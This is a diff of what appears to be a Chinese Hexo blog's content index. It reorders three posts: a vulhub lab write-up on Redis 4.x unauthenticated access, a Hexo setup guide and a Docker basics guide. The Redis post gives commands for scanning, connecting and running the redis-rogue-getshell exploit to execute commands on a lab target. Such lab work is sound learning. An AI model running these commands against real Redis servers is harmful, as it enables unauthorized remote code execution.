@@ -166,6 +166,188 @@
       </tags>
   </entry>
   <entry>
+    <title>redis 4-unacc</title>
+    <url>/2021/06/28/redis-4-unacc/</url>
+    <content><![CDATA[<h1 id="Redis-4-unacc"><a href="#Redis-4-unacc" class="headerlink" title="Redis 4-unacc"></a>Redis 4-unacc</h1><p>测试环境：</p>
+<h2 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h2><p>使用docker和docker-compose运行漏洞环境vulhub</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">进入vulhub中Redis的4-unacc目录</span><br><span class="line">docker-compose build &#x2F;&#x2F;对靶场进行编译</span><br><span class="line">docker-compose up -d &#x2F;&#x2F;运行靶场</span><br><span class="line">docker-compose down &#x2F;&#x2F;移除靶场</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://i.loli.net/2021/06/28/qJgE9XUH8Nwrl4s.png"></p>
+<p><img src="https://i.loli.net/2021/06/28/eTB7CAV3FbQmRlt.png" alt="image-20210628210758753"></p>
+<h2 id="安装Redis"><a href="#安装Redis" class="headerlink" title="安装Redis"></a>安装Redis</h2><p>攻击机也要安装Redis</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-2.8.12.tar.gz #下载</span><br><span class="line">2.tar -xzf redis-2.8.12.tar.gz #解压</span><br><span class="line">3.cd到redis-2.8.12 目录下</span><br><span class="line">4.输入命令make #安装</span><br><span class="line">5.进入redis-2.8.12&#x2F;src&#x2F;目录下</span><br><span class="line">6.输入命令&#96;.&#x2F;redis-cli -h&#96;，出现帮助内容就表示可以使用了</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/06/28/8HXJehCYPLgbwRn.png" alt="image-20210628131141013"></p>
+<h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p>nmap可以扫描出靶机6379的Redis服务器</p>
+<p><img src="https://i.loli.net/2021/06/28/eJ7SLuprHd4xIWw.png" alt="image-20210628142638144"></p>
+<h2 id="Redis直接连接"><a href="#Redis直接连接" class="headerlink" title="Redis直接连接"></a>Redis直接连接</h2><p>可以使用kali中的Redis直接连接<code>./redis-cli -h ip</code></p>
+<p>使用<code>info</code>可以查看到一些服务器的敏感信息</p>
+<p><img src="https://i.loli.net/2021/06/28/92slmStOpfTcWnA.png" alt="image-20210628142952657"></p>
+<h2 id="下载exp到本地"><a href="#下载exp到本地" class="headerlink" title="下载exp到本地"></a>下载exp到本地</h2><p><img src="https://i.loli.net/2021/06/28/unGywmoYF3XRehd.png" alt="image-20210628143941751"></p>
+<h2 id="make编译exp"><a href="#make编译exp" class="headerlink" title="make编译exp"></a>make编译exp</h2><p>cd到<code>redis-rogue-server /RedisModulesSDK/exp/</code>目录下，使用make进行编译，该目录下会多出<code>exp.o</code>和<code>exp.so</code>两个文件</p>
+<p><img src="https://i.loli.net/2021/06/28/wOQgcMWfEeASXGb.png" alt="image-20210628144722979"></p>
+<p><img src="https://i.loli.net/2021/06/28/uC1FEcHXLQidvGM.png" alt="image-20210628144753019"></p>
+<p>返回到<code>redis-rogue-server.py</code>目录下</p>
+<p><code>./redis-rogue-server.py --rhost  --lhost </code></p>
+<p><img src="https://i.loli.net/2021/06/28/u1UFq7KBPRaIC8p.png" alt="image-20210628145723698"></p>
+<p>然后就卡住了。。</p>
+<p>换了个exp</p>
+<p><code>git clone https://github.com/vulhub/redis-rogue-getshell.git</code></p>
+<p><img src="/2021/06/28/redis-4-unacc/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210628191840574.png" alt="image-20210628191840574"></p>
+<p><code>./redis-master.py -r 靶机IP -p 6379 -L 攻击机IP -P 8989 -f RedisModulesSDK/exp/exp.so -c &quot;whoami&quot;</code></p>
+<p><img src="https://i.loli.net/2021/06/28/7Rr1X2tn9oMcCYb.png" alt="image-20210628200252772"></p>
+<p>然后就又卡住了。。。</p>
+<h2 id="在另一台kali上搭建docker"><a href="#在另一台kali上搭建docker" class="headerlink" title="在另一台kali上搭建docker"></a>在另一台kali上搭建docker</h2><p>结果原来的阿里源不能用了，又折腾了半天换源。。（图中的是中科大的源也还是不行）</p>
+<p><img src="https://i.loli.net/2021/06/28/qJRZCSbj37pl6fk.png" alt="image-20210628203059513"></p>
+<p>最后也是糊里糊涂添加了一堆源</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#中科大</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">#阿里云</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">#清华大学</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">#163</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy main non-free contrib</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy-proposed-updates main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy-proposed-updates main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian-security wheezy&#x2F;updates main non-free contrib</span><br><span class="line">#东软大学</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.neusoft.edu.cn&#x2F;kali kali-rolling&#x2F;main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.neusoft.edu.cn&#x2F;kali kali-rolling&#x2F;main non-free contrib</span><br></pre></td></tr></table></figure>
+<p>然后就可以了。。。淦</p>
+<p>直连成功</p>
+<p><img src="https://i.loli.net/2021/06/28/jGkwFEeo6zlWJVa.png" alt="image-20210628204907522"></p>
+<p><code>./redis-master.py -r 192.168.229.137 -p 6379 -L 192.168.229.129 -P 8989 -f RedisModulesSDK/exp/exp.so -c &quot;whoami&quot;</code></p>
+<p><img src="https://i.loli.net/2021/06/28/xaeSJCN8zQfIvbE.png" alt="image-20210628205215675"></p>
+<p>不过是<code>eredis</code>是什么鬼？？？</p>
+<p>第一个exp也可以利用</p>
+<p><img src="https://i.loli.net/2021/06/28/kE2gR3pcPFxudeh.png" alt="image-20210628210157607"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉自己啥都没做，差太多了，还有</p>
+<blockquote>
+<p>这里只是使用vulhub漏洞环境，只能通过该exp来getshell，像通过写文件、ssh key或定时计划来getshell,都是不成功的，会提示没有权限</p>
+</blockquote>
+<p>考完就尝试另外三个方法</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/yiiiing/article/details/108218674">Redis 4.x5.x 未授权访问漏洞EXP复现过程</a></p>
+<p><a href="https://blog.csdn.net/roukmanx/article/details/103682318">Redis 4.x/5.x 未授权访问漏洞</a></p>
+<p><a href="https://www.cnblogs.com/rnss/p/13612703.html">redis 4-unacc 复现</a></p>
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>redis</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo初使用</title>
+    <url>/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<blockquote>
+<p>写在前面：由于这个hexo框架是迁移过来的，没有讲到一些详细的配置，<a href="https://www.pianshen.com/article/9290564319/">这个博主的步骤比较详细</a></p>
+</blockquote>
+<h2 id="前提准备"><a href="#前提准备" class="headerlink" title="前提准备"></a>前提准备</h2><ul>
+<li>Node.js</li>
+<li>git</li>
+<li>hexo</li>
+<li>GitHub账号</li>
+</ul>
+<h2 id="新建一个仓库"><a href="#新建一个仓库" class="headerlink" title="新建一个仓库"></a>新建一个仓库</h2><p>命名格式：自己的用户名+github.io</p>
+<h2 id="使用git-bash"><a href="#使用git-bash" class="headerlink" title="使用git bash"></a>使用git bash</h2><p>右键<em>git bash</em></p>
+<p>配置全局变量,并生成密钥</p>
+<p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210503181732696.png" alt="image-20210503181732696"></p>
+<h2 id="修改博客配置文件"><a href="#修改博客配置文件" class="headerlink" title="修改博客配置文件"></a>修改博客配置文件</h2><p>打开_config.yml文件，修改<em>type,repository,branch</em></p>
+<p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210503205250686.png" alt="image-20210503205250686"></p>
+<blockquote>
+<p>这里有一个坑是，当配置好之后还要在github上的这个仓库中<em>设置github pages里面branch为master</em></p>
+</blockquote>
+<h2 id="安装git插件并且部署到github上"><a href="#安装git插件并且部署到github上" class="headerlink" title="安装git插件并且部署到github上"></a>安装git插件并且部署到github上</h2><ul>
+<li>npm install hexo-deployer-git –save</li>
+</ul>
+<blockquote>
+<p>要在博客目录下右键git bash运行</p>
+</blockquote>
+<ul>
+<li>hexo clean （清除缓存和静态文件）</li>
+<li>hexo g （生成静态文件）</li>
+<li>hexo d （部署）</li>
+</ul>
+<p>使用<em>hexo s</em>（启动服务）可以进行本地浏览</p>
+<p><a href="https://hexo.io/zh-cn/docs/commands.html">hexo指令</a></p>
+<blockquote>
+<p>还可以绑定域名，使用一些其他主题等，更多花样等你解锁</p>
+</blockquote>
+<h2 id="踩的一些坑"><a href="#踩的一些坑" class="headerlink" title="踩的一些坑"></a>踩的一些坑</h2><h3 id="md语法规范"><a href="#md语法规范" class="headerlink" title="md语法规范"></a>md语法规范</h3><p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210504161203383.png" alt="image-20210504161203383"></p>
+<p>这是由于<code>hexo n &quot;新建的md文件名&quot;</code>（新建一篇文章）时生成的md文件标注语法不规范</p>
+<p>这里的<code>tag</code>和<code>categories</code>后都要加空格才行</p>
+<p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210504161835965.png" alt="image-20210504161835965"></p>
+<h3 id="解决图片无法显示的问题"><a href="#解决图片无法显示的问题" class="headerlink" title="解决图片无法显示的问题"></a>解决图片无法显示的问题</h3><p>除此之外就是一些其他设置</p>
+<ul>
+<li>安装插件</li>
+<li>_config.yml选项设置</li>
+<li>使用相对路径</li>
+</ul>
+<blockquote>
+<p>最最最重要的是<strong>图片路径要使用相对路径</strong></p>
+</blockquote>
+<p><a href="https://www.jianshu.com/p/3db6a61d3782">hexo使用markdown图片无法显示问题</a></p>
+<h3 id="添加背景图片的路径问题"><a href="#添加背景图片的路径问题" class="headerlink" title="添加背景图片的路径问题"></a>添加背景图片的路径问题</h3><p>图片直接放在<em>public</em>下的<em>images</em>文件夹中使用相对路径调用即可</p>
+]]></content>
+      <categories>
+        <category>hexo</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>docker基本使用</title>
+    <url>/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><a href="https://blog.csdn.net/wzsy_ll/article/details/82866627">docker安装教程</a></p>
+<h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="镜像相关操作"><a href="#镜像相关操作" class="headerlink" title="镜像相关操作"></a>镜像相关操作</h2><h3 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker search 镜像名</span><br></pre></td></tr></table></figure>
+<h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull 镜像名</span><br></pre></td></tr></table></figure>
+<h3 id="查看所有镜像"><a href="#查看所有镜像" class="headerlink" title="查看所有镜像"></a>查看所有镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/images.png" alt="image-20210417215354480"></p>
+<h3 id="运行镜像"><a href="#运行镜像" class="headerlink" title="运行镜像"></a>运行镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 本机端口：容器端口 镜像名称</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>参数解释：</p>
+<p>-d 镜像在后台运行</p>
+<p>-p 指定本机与容器内部交互的端口 -P则是随机开放一个端口与容器内部ID映射</p>
+<p>也就是将后面的<em>acgpiano/sqli-labs的80端口</em>映射到前面的主机某一端口</p>
+</blockquote>
+<p>例：<del>把本机的8801端口映射到容器的8801端口</del>，事实证明sqli-labs容器的端口必须是80，不然会失败</p>
+<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/run.png" alt="image-20210417222849702"></p>
+<blockquote>
+<p>请注意这张图片中的容器端口8801是错误的</p>
+</blockquote>
+<p>但是会报错，是因为没有开启ipv4转发</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/yelllowcong/article/details/78295600">IPv4 forwarding is disabled. Networking will not work.</a></p>
+</blockquote>
+<p>进入配置文件，修改<em>net.ipv4.ip_forward=1</em></p>
+<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/net.ipv4.png" alt="image-20210417222634372"></p>
+<p>重启服务并查看修改是否成功</p>
+<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/%E6%9F%A5%E7%9C%8B.png" alt="image-20210417222728689"></p>
+<blockquote>
+<p>还要记得把刚刚运行镜像的容器删除，不然会有容器已存在的报错</p>
+</blockquote>
+<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/sqli-labs%E7%95%8C%E9%9D%A2.png" alt="image-20210418160119935"></p>
+<blockquote>
+<p>成功访问</p>
+</blockquote>
+<h2 id="容器的相关操作"><a href="#容器的相关操作" class="headerlink" title="容器的相关操作"></a>容器的相关操作</h2><h3 id="查看正在运行的容器"><a href="#查看正在运行的容器" class="headerlink" title="查看正在运行的容器"></a>查看正在运行的容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker ps</span><br><span class="line">docker ps -a 查看运行过的容器</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/ps.png" alt="image-20210417223707346"></p>
+<h3 id="进入容器内部"><a href="#进入容器内部" class="headerlink" title="进入容器内部"></a>进入容器内部</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it 容器id bash</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/exec.png" alt="image-20210417223949376"></p>
+<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/sqli-labs%E9%85%8D%E7%BD%AE.png" alt="image-20210418160159989"></p>
+<h3 id="退出容器-exit"><a href="#退出容器-exit" class="headerlink" title="退出容器 exit"></a>退出容器 exit</h3><h3 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker stop 容器id</span><br></pre></td></tr></table></figure>
+<h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rm 容器id</span><br></pre></td></tr></table></figure>
+<h3 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rmi 镜像id</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>删除容器和镜像时需要注意的是：</p>
+<p>因为是镜像启动后会产生容器，要删除镜像的话必须先删除容器</p>
+</blockquote>
+<h2 id="构建镜像并发布自己的项目"><a href="#构建镜像并发布自己的项目" class="headerlink" title="构建镜像并发布自己的项目"></a>构建镜像并发布自己的项目</h2><p><a href="https://blog.csdn.net/wzsy_ll/article/details/82866627">详见大佬博客</a></p>
+]]></content>
+      <categories>
+        <category>docker</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>web入门sql注入</title>
     <url>/2021/06/24/ctf-web%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h1 id="ctf-web入门之sql注入-无过滤注入"><a href="#ctf-web入门之sql注入-无过滤注入" class="headerlink" title="ctf-web入门之sql注入-无过滤注入"></a>ctf-web入门之sql注入-无过滤注入</h1><h2 id="day4-web入门之sql注入-无过滤注入"><a href="#day4-web入门之sql注入-无过滤注入" class="headerlink" title="day4 web入门之sql注入-无过滤注入"></a>day4 web入门之sql注入-无过滤注入</h2><h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><p>单引号报错，使用<code>--+</code>进行注释</p>
@@ -279,188 +461,6 @@
       </tags>
   </entry>
   <entry>
-    <title>docker基本使用</title>
-    <url>/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><a href="https://blog.csdn.net/wzsy_ll/article/details/82866627">docker安装教程</a></p>
-<h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="镜像相关操作"><a href="#镜像相关操作" class="headerlink" title="镜像相关操作"></a>镜像相关操作</h2><h3 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker search 镜像名</span><br></pre></td></tr></table></figure>
-<h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull 镜像名</span><br></pre></td></tr></table></figure>
-<h3 id="查看所有镜像"><a href="#查看所有镜像" class="headerlink" title="查看所有镜像"></a>查看所有镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/images.png" alt="image-20210417215354480"></p>
-<h3 id="运行镜像"><a href="#运行镜像" class="headerlink" title="运行镜像"></a>运行镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 本机端口：容器端口 镜像名称</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>参数解释：</p>
-<p>-d 镜像在后台运行</p>
-<p>-p 指定本机与容器内部交互的端口 -P则是随机开放一个端口与容器内部ID映射</p>
-<p>也就是将后面的<em>acgpiano/sqli-labs的80端口</em>映射到前面的主机某一端口</p>
-</blockquote>
-<p>例：<del>把本机的8801端口映射到容器的8801端口</del>，事实证明sqli-labs容器的端口必须是80，不然会失败</p>
-<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/run.png" alt="image-20210417222849702"></p>
-<blockquote>
-<p>请注意这张图片中的容器端口8801是错误的</p>
-</blockquote>
-<p>但是会报错，是因为没有开启ipv4转发</p>
-<blockquote>
-<p><a href="https://blog.csdn.net/yelllowcong/article/details/78295600">IPv4 forwarding is disabled. Networking will not work.</a></p>
-</blockquote>
-<p>进入配置文件，修改<em>net.ipv4.ip_forward=1</em></p>
-<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/net.ipv4.png" alt="image-20210417222634372"></p>
-<p>重启服务并查看修改是否成功</p>
-<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/%E6%9F%A5%E7%9C%8B.png" alt="image-20210417222728689"></p>
-<blockquote>
-<p>还要记得把刚刚运行镜像的容器删除，不然会有容器已存在的报错</p>
-</blockquote>
-<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/sqli-labs%E7%95%8C%E9%9D%A2.png" alt="image-20210418160119935"></p>
-<blockquote>
-<p>成功访问</p>
-</blockquote>
-<h2 id="容器的相关操作"><a href="#容器的相关操作" class="headerlink" title="容器的相关操作"></a>容器的相关操作</h2><h3 id="查看正在运行的容器"><a href="#查看正在运行的容器" class="headerlink" title="查看正在运行的容器"></a>查看正在运行的容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker ps</span><br><span class="line">docker ps -a 查看运行过的容器</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/ps.png" alt="image-20210417223707346"></p>
-<h3 id="进入容器内部"><a href="#进入容器内部" class="headerlink" title="进入容器内部"></a>进入容器内部</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it 容器id bash</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/exec.png" alt="image-20210417223949376"></p>
-<p><img src="/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/sqli-labs%E9%85%8D%E7%BD%AE.png" alt="image-20210418160159989"></p>
-<h3 id="退出容器-exit"><a href="#退出容器-exit" class="headerlink" title="退出容器 exit"></a>退出容器 exit</h3><h3 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker stop 容器id</span><br></pre></td></tr></table></figure>
-<h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rm 容器id</span><br></pre></td></tr></table></figure>
-<h3 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rmi 镜像id</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>删除容器和镜像时需要注意的是：</p>
-<p>因为是镜像启动后会产生容器，要删除镜像的话必须先删除容器</p>
-</blockquote>
-<h2 id="构建镜像并发布自己的项目"><a href="#构建镜像并发布自己的项目" class="headerlink" title="构建镜像并发布自己的项目"></a>构建镜像并发布自己的项目</h2><p><a href="https://blog.csdn.net/wzsy_ll/article/details/82866627">详见大佬博客</a></p>
-]]></content>
-      <categories>
-        <category>docker</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hexo初使用</title>
-    <url>/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<blockquote>
-<p>写在前面：由于这个hexo框架是迁移过来的，没有讲到一些详细的配置，<a href="https://www.pianshen.com/article/9290564319/">这个博主的步骤比较详细</a></p>
-</blockquote>
-<h2 id="前提准备"><a href="#前提准备" class="headerlink" title="前提准备"></a>前提准备</h2><ul>
-<li>Node.js</li>
-<li>git</li>
-<li>hexo</li>
-<li>GitHub账号</li>
-</ul>
-<h2 id="新建一个仓库"><a href="#新建一个仓库" class="headerlink" title="新建一个仓库"></a>新建一个仓库</h2><p>命名格式：自己的用户名+github.io</p>
-<h2 id="使用git-bash"><a href="#使用git-bash" class="headerlink" title="使用git bash"></a>使用git bash</h2><p>右键<em>git bash</em></p>
-<p>配置全局变量,并生成密钥</p>
-<p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210503181732696.png" alt="image-20210503181732696"></p>
-<h2 id="修改博客配置文件"><a href="#修改博客配置文件" class="headerlink" title="修改博客配置文件"></a>修改博客配置文件</h2><p>打开_config.yml文件，修改<em>type,repository,branch</em></p>
-<p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210503205250686.png" alt="image-20210503205250686"></p>
-<blockquote>
-<p>这里有一个坑是，当配置好之后还要在github上的这个仓库中<em>设置github pages里面branch为master</em></p>
-</blockquote>
-<h2 id="安装git插件并且部署到github上"><a href="#安装git插件并且部署到github上" class="headerlink" title="安装git插件并且部署到github上"></a>安装git插件并且部署到github上</h2><ul>
-<li>npm install hexo-deployer-git –save</li>
-</ul>
-<blockquote>
-<p>要在博客目录下右键git bash运行</p>
-</blockquote>
-<ul>
-<li>hexo clean （清除缓存和静态文件）</li>
-<li>hexo g （生成静态文件）</li>
-<li>hexo d （部署）</li>
-</ul>
-<p>使用<em>hexo s</em>（启动服务）可以进行本地浏览</p>
-<p><a href="https://hexo.io/zh-cn/docs/commands.html">hexo指令</a></p>
-<blockquote>
-<p>还可以绑定域名，使用一些其他主题等，更多花样等你解锁</p>
-</blockquote>
-<h2 id="踩的一些坑"><a href="#踩的一些坑" class="headerlink" title="踩的一些坑"></a>踩的一些坑</h2><h3 id="md语法规范"><a href="#md语法规范" class="headerlink" title="md语法规范"></a>md语法规范</h3><p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210504161203383.png" alt="image-20210504161203383"></p>
-<p>这是由于<code>hexo n &quot;新建的md文件名&quot;</code>（新建一篇文章）时生成的md文件标注语法不规范</p>
-<p>这里的<code>tag</code>和<code>categories</code>后都要加空格才行</p>
-<p><img src="/2021/05/04/hexo%E5%88%9D%E4%BD%BF%E7%94%A8/image-20210504161835965.png" alt="image-20210504161835965"></p>
-<h3 id="解决图片无法显示的问题"><a href="#解决图片无法显示的问题" class="headerlink" title="解决图片无法显示的问题"></a>解决图片无法显示的问题</h3><p>除此之外就是一些其他设置</p>
-<ul>
-<li>安装插件</li>
-<li>_config.yml选项设置</li>
-<li>使用相对路径</li>
-</ul>
-<blockquote>
-<p>最最最重要的是<strong>图片路径要使用相对路径</strong></p>
-</blockquote>
-<p><a href="https://www.jianshu.com/p/3db6a61d3782">hexo使用markdown图片无法显示问题</a></p>
-<h3 id="添加背景图片的路径问题"><a href="#添加背景图片的路径问题" class="headerlink" title="添加背景图片的路径问题"></a>添加背景图片的路径问题</h3><p>图片直接放在<em>public</em>下的<em>images</em>文件夹中使用相对路径调用即可</p>
-]]></content>
-      <categories>
-        <category>hexo</category>
-      </categories>
-      <tags>
-        <tag>hexo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>redis 4-unacc</title>
-    <url>/2021/06/28/redis-4-unacc/</url>
-    <content><![CDATA[<h1 id="Redis-4-unacc"><a href="#Redis-4-unacc" class="headerlink" title="Redis 4-unacc"></a>Redis 4-unacc</h1><p>测试环境：</p>
-<h2 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h2><p>使用docker和docker-compose运行漏洞环境vulhub</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">进入vulhub中Redis的4-unacc目录</span><br><span class="line">docker-compose build &#x2F;&#x2F;对靶场进行编译</span><br><span class="line">docker-compose up -d &#x2F;&#x2F;运行靶场</span><br><span class="line">docker-compose down &#x2F;&#x2F;移除靶场</span><br></pre></td></tr></table></figure>
-
-
-<p><img src="https://i.loli.net/2021/06/28/qJgE9XUH8Nwrl4s.png"></p>
-<p><img src="https://i.loli.net/2021/06/28/eTB7CAV3FbQmRlt.png" alt="image-20210628210758753"></p>
-<h2 id="安装Redis"><a href="#安装Redis" class="headerlink" title="安装Redis"></a>安装Redis</h2><p>攻击机也要安装Redis</p>
